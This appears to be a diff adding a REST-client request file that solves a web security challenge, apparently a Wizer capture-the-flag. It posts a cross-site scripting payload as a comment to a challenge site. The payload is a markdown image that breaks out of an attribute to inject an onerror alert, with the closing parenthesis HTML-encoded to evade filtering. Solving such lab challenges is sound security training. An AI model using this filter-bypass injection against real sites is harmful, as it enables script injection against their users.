@@ -1,0 +1,10 @@
+@url = https://chal47-frjvin5.vercel.app/
+@sid = fb473d59-c914-454f-a2a5-8183625b221a
+@payload = ![ ]("onerror="alert('Wizer'&#41;)
+
+POST {{url}}/comment?sid={{sid}} HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+comment={{payload}}
+
+###
